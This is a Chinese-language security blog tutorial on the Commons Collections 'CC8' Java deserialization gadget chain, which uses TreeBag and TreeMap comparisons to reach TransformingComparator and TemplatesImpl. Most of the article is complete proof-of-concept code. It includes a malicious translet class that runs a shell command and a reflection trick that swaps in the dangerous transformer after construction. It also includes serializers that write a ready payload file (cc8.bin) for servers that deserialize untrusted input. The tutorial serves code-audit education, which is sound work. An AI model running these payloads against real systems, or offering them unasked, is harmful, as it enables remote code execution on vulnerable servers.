#  java反序列化之-cc8链-手把手教你学代码审计与poc编写  
原创 三呼呼
                        三呼呼  古月安全   2026-04-16 01:34  
  
**前言**  
  
回顾一下CC2和CC4，为了解决CC1中AnnotationInvocationHandler不可用的问题，CC2使用了PriorityQueue作为入口，通过TransformingComparator的compare方法来调用InvokerTransformer。****  
  
**CC2调用链**  
：  
  
PriorityQueue.readObject() -> TransformingComparator.compare() -> InvokerTransformer.transform() -> ...等 而CC4在CC2的基础上它使用了InstantiateTransformer来触发TemplatesImpl的实例化，从而执行字节码。****  
  
**CC4调用链**  
：  
  
PriorityQueue.readObject() -> TransformingComparator.compare() -> ChainedTransformer -> InstantiateTransformer -> 实例化TrAXFilter -> 调用TemplatesImpl.newTransformer() -> 执行字节码。  
  
 两条链都利用了PriorityQueue作为反序列化的切入点，都利用了优先队列（PriorityQueue） 这一基于二叉堆的数据结构。在readObject()方法中会进行节点的比较，进而触发Comparator[#compare]()  
()，最终导致Transformer[#transform]()  
()的执行。 而CC8链，也是建立在这个逻辑之上的。因为除了除了二叉堆，还有其他基于二叉树的数据结构在反序列化时也会调用Comparator[#compare]()  
。比如**红黑树**  
。  
  
**红黑树基础概念**  
  
红黑树是一种自平衡的排序二叉树，在Java集合框架中，TreeMap和TreeSet就是通过红黑树实现的。当反序列化一个TreeMap时，其readObject方法会重新构建红黑树，期间必然要对插入的键进行比较，从而调用Comparator[#compare]()  
，至于红黑树，和二叉树的概念各位自行了解一下，**简单来说，就是当要将一个数据对象插入到集合类的对象中时，就会先进行比较，根据比较结果才能确定放在哪个节点上，是否已经存在这个数据对象。对于有序集合（如 TreeMap、TreeSet）和优先队列（PriorityQueue），插入元素时必须通过比较来确定元素的位置（红黑树中的节点）或者判断是否重复（TreeMap 中键已存在则替换值）。**  
  
而CC8链正是利用了TreeBag——一个基于TreeMap实现的Bag（多集合）容器。TreeBag内部持有一个TreeMap，在反序列化时，doReadObject会遍历所有元素并调用map.put，这一过程会触发红黑树节点的比较，从而调用Comparator[#compare]()  
。如果我们把Comparator设置为TransformingComparator，那么compare就会调用InvokerTransformer[#transform]()  
，最终反射执行任意代码。  
  
**原理深度分析**  
  
环境复用CC2（[java反序列化之-cc2链-手把手教你学代码审计 与poc编写](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484086&idx=1&sn=577965f5801e86e93bc1910c6b474252&scene=21#wechat_redirect)  
）和CC4（[java反序列化之-cc4链-手把手教你学代码审计与poc编写](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484375&idx=1&sn=8792bd3d0cd5b219ba4061adc75ff314&scene=21#wechat_redirect)  
）的，导入对应的commons-collections版本  
```
<dependencies>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
</dependencies>
```  
  
**TreeBag是关键**  
  
首先看看TreeBag类的结构：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn5gZHLQdCLuraVgicibAVQLiaQOZgLRxdkdPQOuEZib20bOdLqUQZgYzcSft6EiaSgdjk3qQevpvabMASiaiccriccLYp9Qgm7AZSUKZKM/640?wx_fmt=other&from=appmsg "")  
  
如图该类竟然有自己的序列化和反序列化方法，并且它的构造方法中，可以传入Comparator对象。  
  
再看看它的反序列化方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5jlg0YpK08BEgbwhHGDBgjibr8M398v2TzHjib0ZUId6Lic4UhRRA6LhMFIibqWNJHlLgW0xohY1Rg6eJW8FYr7uVwajeLUIuY6AI/640?wx_fmt=other&from=appmsg "")  
  
它会将Comparator对象传递给一个TreeMap对象，同时调用父类的doReadObject方法，我们看看这个方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn519WlYIP3MMWGSz9RgXDs7RMkPAkm9oCvZ6PFeC1TF13HjhGGgRVaRmT3Ifuog8K6aJddH4spxuLTuDiawKJJoNIoojrmr63Mc/640?wx_fmt=other&from=appmsg "")  
  
在该方法中，遍历该对象的所有元素，并调用map.put方法，将元素插入到treemap中。那么put方法做了啥？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6oWKs1w3LZhJAN1QtaDduN0T6yOCMPgYBicypTibuf50rAEt5tnjHlVW5BvnHUJSSyc6wTVTDfTBib4bickOpN1QCEaqX1hlIa19k/640?wx_fmt=other&from=appmsg "")  
  
在put方法中，如果元素不为空，即刚才的这里不是空的Comparator对象，就会进行比较，调用cpr.compare(key, t.key);方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn7kueq6L2XzicRvmobzDg27LPPibvicLeELojtjSwaib2XlxtbvNiciaiapBZZTicjdI4OBj2Xm4n3t4bbVlicHUZ7JOvBuw7Ntsf8S0QFY/640?wx_fmt=other&from=appmsg "")  
  
而Comparator<? super K> cpr = comparator;所以：**条件1、需要这个comparator 是我们可控的一个comparator**  
，比如CC2和CC4链中的comparator。以及**条件2.key=TemplatesImpl对象，包含恶意类**  
  
**那么条件1中的comparator是哪儿来的**  
，如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn7vyOnceianI8MdW2abRc21k4nDRzCicaPM10jjT8GO75QxNaTUF2kcciboHWdrR8U3vSqpOjeOQM3aE936lGgeDfDQDW6Hu93D64/640?wx_fmt=other&from=appmsg "")  
  
在实例化treemap的时候直接赋值。而TreeBag在实例化的时候，就会调用TreeMap的实例化方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn4iag6uQmD1gfNibC5VNxnNxfswXNRYicIVfx3Agia7kL9sb2x7wTgqQmNHFgqhm2lkdQBEj94q5BxVlZZCgSRmbsUOuib0lEBSfu3U/640?wx_fmt=other&from=appmsg "")  
  
所以相当于只要实例化TreeBag的时候传入一个comparator对象就行了。同时调用super方法，将treemap赋值给map。图下图：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn4rb2YuQj66pMW8ZKpbz9peHtq0ia4AicTTMQT5ON8g3lh9JChwPb9ibMablzgAt4L6bKWTDxo1ILd03ciarI2VFXFt83ehiaEdwGgI/640?wx_fmt=other&from=appmsg "")  
  
**那么条件2呢？**  
这个key是通过put方法传过来的，而obj又是TreeBag反序列化循环得到的，所以只要TreeBag对象中存在TemplatesImpl对象就行了，只需要将TemplatesImpl对象添加到TreeBag对象中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn6Cb2szd2nET4rXA5gyISmfnlDialSicwXicVMRCMk8Mic6r6SJIBCkBWLdKUPy4neRC0ZPf0kCsBFkK5DFVpU7KHqgCPgOXbicMqibo/640?wx_fmt=other&from=appmsg "")  
  
刚好TreeBag类中存在add方法，可以将一个对象添加到TreeBag对象中。如果这个对象是TemplatesImpl对象的话。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn4T1XsD0qcZkPmsq4srQhaVCgcbUpL95LCbdpg36ZI3tPc7TbFZhdbyNK4FHCf1S3JjG72Yk2w7pQmCfpYibfjWdNcG2Pjfiajh0/640?wx_fmt=other&from=appmsg "")  
  
如下图：最终添加在它的map属性中，而这个map又是TreeBag实例化的时候，创建的TreeMap对象，上面已经看到了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn5aA9WZNp97RO5B0ymdu2qsmIW3kDq3RQfkKSD18WLN56iaVVgDvKHiax10TFKJ5YEd1ATcYEria5BWdFaeorpuLMicvOUmJz9Wwqw/640?wx_fmt=other&from=appmsg "")  
  
最终就会将TemplatesImpl对象添加到TreeBag对象的TreeMap属性中。  
  
捋一下：这里的map=TreeMap。如果我们调用TreeBag.add(TemplatesImpl)，那么就会调用TreeMap的put方法。put方法就会调用cpr.compare(key, t.key);方法，从而导致命令执行。  
  
**POC实现**  
  
初探  
  
简单回顾：CC2和CC4利用TemplatesImpl在调用newTransformer()的时候，会通过字节码创建一个对象，而对象创建的时候会自动执行其构造方法或者静态代码块，如果构造方法中包含恶意代码，即可实现任意代码执行。具体详情，可仔细查看我的CC2和CC4的文章  
  
这里直接跳过前面的细节跳转-（[java反序列化之-cc2链-手把手教你学代码审计 与poc编写](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484086&idx=1&sn=577965f5801e86e93bc1910c6b474252&scene=21#wechat_redirect)  
），首先来创建一个恶意类，继承至AbstractTranslet，构造方法中执行命令，代码如下：  
```
package com.CC8;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class Exec extends AbstractTranslet {
    public Exec() {
 try {
            Process process = Runtime.getRuntime().exec("whoami");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            System.out.println("命令执行结果：");
            while ((line = reader.readLine()) != null) {
                System.out.println(line); // 逐行打印命令执行结果
}
            reader.close(); // 关闭流
process.waitFor();
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```  
  
然后是利用TreeBag对象实现调用上面的恶意类对象，并执行代码：但是这里使用的是add方法看看能否成功呢？  
```
package com.CC8;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
public class CC8Exec {
    public static void main(String[] args) throws  Exception {
// 使用Javassist动态生成恶意类的字节码
ClassPool classPool = ClassPool.getDefault();
        byte[] execBytes = classPool.get("com.CC8.Exec").toBytecode();
        // ========== 第一步：创建并配置TemplatesImpl对象 ==========
        // TemplatesImpl是JDK内部类，这是XSLT转换的核心类，可用于加载和执行字节码
TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        // 设置_name字段 - TemplatesImpl要求这个字段不能为空
Field _nameField = templatesClass.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates, "aaa");
        // 设置_tfactory字段 - 转换器工厂，TemplatesImpl执行时需要
Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates, new TransformerFactoryImpl());
        // 设置_bytecodes字段 - 核心：包含要执行的恶意字节码
Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates, new byte[][]{execBytes});
InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);
//创建TransformingComparator对象，并将invokerTransformer传入，初始化其属性transformer
TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
//        transformingComparator.compare(templates,123);//让compare方法帮们执行transformer()方法
TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(templates);//手动添加templates，这里就会触发命令执行。
    }
}
```  
  
运行该程序，如下图：成功执行命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn45xzlgqyywWhExSpZG1pU8qwUfdnKicxHQ7ECicFPvqhxRHGrxThEuyY40CsbwuicnBD0Tiajrjff8QSXqicRriaib9NuBCMteS3J5N0/640?wx_fmt=other&from=appmsg "")  
  
**初探深入过程-CC2基础上的CC8**  
  
那么现在依据理论是不是我们只需要将这个对象序列化出来，然后再服务器反序列化一下，就成功了呢？现在写一个序列化方法，就在当前类下的静态方法如下：  
```
package com.CC8;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
public class CC8Exec {
    /**
     * 序列化对象到文件
     * @param object 要序列化的对象
     */
    public static void serialize(Object object) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("cc8.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();
        System.out.println("序列化完成，恶意对象已保存到 cc8.bin");
    }

    public static void main(String[] args) throws  Exception {
// 使用Javassist动态生成恶意类的字节码
ClassPool classPool = ClassPool.getDefault();
        byte[] execBytes = classPool.get("com.CC8.Exec").toBytecode();
        // ========== 第一步：创建并配置TemplatesImpl对象 ==========
        // TemplatesImpl是JDK内部类，这是XSLT转换的核心类，可用于加载和执行字节码
TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        // 设置_name字段 - TemplatesImpl要求这个字段不能为空
Field _nameField = templatesClass.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates, "aaa");
        // 设置_tfactory字段 - 转换器工厂，TemplatesImpl执行时需要
Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates, new TransformerFactoryImpl());
        // 设置_bytecodes字段 - 核心：包含要执行的恶意字节码
Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates, new byte[][]{execBytes});
InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", null, null);
//创建TransformingComparator对象，并将invokerTransformer传入，初始化其属性transformer
TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
//        transformingComparator.compare(templates,123);//让compare方法帮们执行transformer()方法
TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(templates);//手动添加templates，这里就会触发命令执行。
           serialize(treeBag);//序列化对象
    }
}
```  
  
再次运行：我们发现，无法执行到序列化这一行，就已经报错了，因为执行到add方法的时候，在执行了命令之后就会报错。因为我们只管执行命令，没有管其他方面的东西，所以这样添加肯定会有奇奇怪怪的异常，当然其他报错并不重要，重要的是只要能执行命令就行了。但是报错之后，后面的就无法执行了，包括序列化对象。这样就得不到一个恶意的序列化对象了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn768x80lywFAWh0Xc9H7QjBvG9msaFr5v56MrmZKBYHnqas4cLtIWhcLzjJ37LBHfP6PIn18pTQn8TjBwia2gxn3VicW8XictdWw0/640?wx_fmt=other&from=appmsg "")  
  
怎么解决呢？答案还是java的反射机制（[java反序列化基础篇-反射](https://mp.weixin.qq.com/s?__biz=Mzk5MDI5NDAyMw==&mid=2247484129&idx=1&sn=a53a4335560b788812c4e7cb21e77842&scene=21#wechat_redirect)  
）。我们知道所有对象都有一个toString方法，通常该方法不会出现报错的情况。所以可以先使用toString方法占位，防止程序报错。然后通过反射的方式，将这个占位的方式修改回newTransformer方法即可。  
  
关键代码实现部分：  
```
        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("toString", null, null);
//创建TransformingComparator对象，并将invokerTransformer传入，初始化其属性transformer
TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
//        transformingComparator.compare(templates,123);//让compare方法帮们执行transformer()方法
TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(templates);
        Field methodNameField = InvokerTransformer.class.getDeclaredField("iMethodName");
        methodNameField.setAccessible(true);
        methodNameField.set(invokerTransformer, "newTransformer");
```  
  
这样执行就没有报错了，并且成功得到序列化之后的文件。然后反序列化一下就OK 了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ic8BH9EFusn60fv9KDialPesMuJpGtOULqHgkaj4mtenzIGwUhgj3SiawsnkVOU0nbyuKibyXnEXptEmiaKTyJFbNsopWmuteJUS7Ya4UDxc6OrU/640?wx_fmt=other&from=appmsg "")  
  
所以最终的poc代码如下：  
```
package com.CC8;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
public class CC8Exec {
    /**
     * 序列化对象到文件
* @param object 要序列化的对象
*/
public static void serialize(Object object) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("cc8.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();
        System.out.println("序列化完成，恶意对象已保存到 cc8.bin");
    }
    /**
     * 从文件反序列化对象并触发漏洞
* 一般是服务端代码部分
*/
public static void deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream("cc8.bin");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject(); // 这里会触发漏洞执行
objectInputStream.close();
        System.out.println("反序列化完成");
    }
    public static void main(String[] args) throws  Exception {
        // 使用Javassist动态生成恶意类的字节码
ClassPool classPool = ClassPool.getDefault();
        byte[] execBytes = classPool.get("com.CC8.Exec").toBytecode(); // com.CC8.Exec 是一个包含静态代码块执行命令的类
// ========== 第一步：创建并配置TemplatesImpl对象 ==========
        // TemplatesImpl是JDK内部类，这是XSLT转换的核心类，可用于加载和执行字节码
TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        // 设置_name字段 - TemplatesImpl要求这个字段不能为空
Field _nameField = templatesClass.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates, "aaa");
        // 设置_tfactory字段 - 转换器工厂，TemplatesImpl执行时需要
Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates, new TransformerFactoryImpl());
        // 设置_bytecodes字段 - 核心：包含要执行的恶意字节码
Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates, new byte[][]{execBytes});
        // ========== 第二步：构造利用链核心组件 ==========
        // 创建一个 InvokerTransformer，使用无害的 "toString" 方法作为占位符
// 避免在构造阶段就触发命令执行
InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("toString", null, null);
        // 创建TransformingComparator对象，并将invokerTransformer传入，初始化其属性transformer
        // TransformingComparator 在 compare 方法中会调用 transformer.transform()
TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
        // （可选）演示 compare 方法会触发 transformer.transform()
        // transformingComparator.compare(templates,123); // 让compare方法帮们执行transformer()方法
// 创建 TreeBag 对象，传入带有占位符 InvokerTransformer 的 TransformingComparator
        // TreeBag 内部使用 TreeMap 存储元素，构造时会将 comparator 传给 TreeMap
TreeBag treeBag = new TreeBag(transformingComparator);
        // 向 TreeBag 中添加 TemplatesImpl 对象
// 这一步会触发红黑树插入比较，从而调用 TransformingComparator.compare
        // 进而执行 invokerTransformer.transform(templates)
        // 由于此时方法名还是 "toString"，只会调用 templates.toString()，不会执行恶意代码
treeBag.add(templates);
        // ========== 第三步：通过反射将方法名改为真正危险的方法 ==========
        // 反射获取 InvokerTransformer 的私有字段 iMethodName
Field methodNameField = InvokerTransformer.class.getDeclaredField("iMethodName");
        methodNameField.setAccessible(true);
        // 将方法名从 "toString" 修改为 "newTransformer"，这样反序列化时就会执行恶意代码
methodNameField.set(invokerTransformer, "newTransformer");
        // ========== 第四步：序列化并反序列化触发漏洞 ==========
serialize(treeBag);   // 将构造好的 TreeBag 对象序列化到文件
deserialize();        // 反序列化，触发命令执行
}
}
```  
  
运行，命令执行成功：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/ic8BH9EFusn4Pd1cwQyoNgC6eqK87flLzhqjLdibibXPeVH0pcA7qu2m5rVIF44czZiaIPgvTWZEnic3dUbKibYNZ9mW6c4OeicrMs0abQ15EDbRIE/640?wx_fmt=other&from=appmsg "")  
  
**在CC4链基础上的CC8链**  
  
cc4的就不详细介绍了，看之前的文章。这里直接给结果，思路跟上面的基本一致，poc奉上：  
```
package com.CC8;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
/**
 * CC8链利用示例（基于TreeBag + ChainedTransformer）
* 核心思路：使用占位Transformer避免构造时触发命令，通过反射替换为真正的恶意链，
* 使得反序列化时执行命令。
*/
public class CC8Exec2 {
    public static void main(String[] args) throws Exception {
        // ---------- 第一步：生成恶意字节码 ----------
        // 使用Javassist动态生成包含静态代码块执行命令的类字节码
// 假设 com.CC8.Exec 是一个继承AbstractTranslet且静态块中执行calc的类
ClassPool classPool = ClassPool.getDefault();
        byte[] execBytes = classPool.get("com.CC8.Exec").toBytecode();
        // ---------- 第二步：构造TemplatesImpl，存储恶意字节码 ----------
TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        // 设置_name字段（不能为null）
Field _nameField = templatesClass.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templates, "aaa");
        // 设置_tfactory字段（转换器工厂，避免NPE）
Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
        _tfactoryField.setAccessible(true);
        _tfactoryField.set(templates, new TransformerFactoryImpl());
        // 设置_bytecodes字段，存放恶意类字节码（二维数组）
Field _bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        _bytecodesField.set(templates, new byte[][]{execBytes});
        // ---------- 第三步：构建占位Transformer ----------
        // 创建一个无害的ChainedTransformer，内部只有一个ConstantTransformer，
// 它返回固定值1，不会触发任何危险操作。
Transformer[] fakeChain = new Transformer[]{new ConstantTransformer(1)};
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeChain);
        // ---------- 第四步：构造TreeBag并添加元素 ----------
        // TransformingComparator包装了chainedTransformer，在比较时会调用其transform方法。
TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        // TreeBag内部使用TreeMap存储，构造时传入comparator。
TreeBag treeBag = new TreeBag(transformingComparator);
        // 向TreeBag添加templates对象。
// 这一步会触发红黑树插入比较，从而调用transformingComparator.compare，
// 进而执行chainedTransformer.transform(templates)。
// 由于此时chainedTransformer内部是占位链（返回1），不会执行任何恶意代码，安全。
treeBag.add(templates);
        // ---------- 第五步：反射替换为真正的恶意链 ----------
        // 获取ChainedTransformer的私有字段iTransformers，它存储了Transformer数组。
Field transformersField = ChainedTransformer.class.getDeclaredField("iTransformers");
        transformersField.setAccessible(true);
        // 构造真正的恶意Transformer链：
// 1. ConstantTransformer(TrAXFilter.class) 固定返回TrAXFilter类对象。
// 2. InstantiateTransformer 调用TrAXFilter的构造方法，传入templates对象。
//    执行 new TrAXFilter(templates) 会调用 templates.newTransformer()，
//    从而加载恶意字节码，执行命令。
Transformer[] realChain = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        // 将chainedTransformer内部的iTransformers替换为真正的恶意链。
// 注意：此时treeBag中的transformingComparator仍然持有chainedTransformer引用，
// 但由于chainedTransformer内部数组已被替换，后续反序列化时就会执行真实恶意逻辑。
transformersField.set(chainedTransformer, realChain);
        // ---------- 第六步：序列化与反序列化触发 ----------
        // 将treeBag对象序列化到文件，此时所有对象状态已包含修改后的恶意链。
serialize(treeBag);
        // 反序列化时，TreeBag.readObject会重新构建内部TreeMap，
// 在插入过程中再次调用比较，此时chainedTransformer已经指向真正的恶意链，
// 从而触发new TrAXFilter(templates) -> templates.newTransformer() -> 命令执行。
deserialize();
    }
    /**
     * 序列化对象到文件cc8.bin
     * @param object 要序列化的对象
*/
public static void serialize(Object object) throws IOException {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc8.bin"))) {
            oos.writeObject(object);
        }
        System.out.println("序列化完成");
    }
    /**
     * 从cc8.bin反序列化对象，触发漏洞执行
*/
public static void deserialize() throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc8.bin"))) {
            System.out.println("反序列化开始：");
            ois.readObject(); // 这里会触发命令执行
}
    }
}
```  
  
同样的需要占位，然后通过反射插入恶意对象。  
  
**总结**  
  
**在Java反序列化漏洞的挖掘中，寻找反序列化时触发Comparator#compare的点是核心思路。PriorityQueue（二叉堆）和TreeMap（红黑树）都提供了这样的机会，而CC8链正是利用了红黑树的这一特性，将攻击入口从优先队列扩展到了TreeBag。其执行链路如下：**  
```
TreeBag.readObject()
  └── TreeBag.doReadObject()
      └── TreeMap.put()                    // 红黑树插入
          └── TreeMap.compare()
              └── TransformingComparator.compare()
                  └── InvokerTransformer.transform()
                      └── TemplatesImpl.newTransformer()
                          └── 加载恶意字节码 → 命令执行
```  
  
**CC8链的本质**  
：利用红黑树（TreeMap  
）在反序列化时必然进行节点比较的特性，通过TreeBag  
触发Comparator#compare  
，进而执行InvokerTransformer  
，最终加载恶意字节码。  
  
**与二叉堆的对比**  
：两者殊途同归，都是通过有序数据结构的重建过程引入比较操作，而比较操作又被TransformingComparator  
“劫持”，转化为任意代码执行。  
  
**拓展思考**  
：所有在反序列化时需要对元素排序的Java集合（如TreeSet  
、TreeMap  
本身）理论上都可作为入口点，关键在于能否控制其Comparator  
并让InvokerTransformer  
调用危险方法  
  
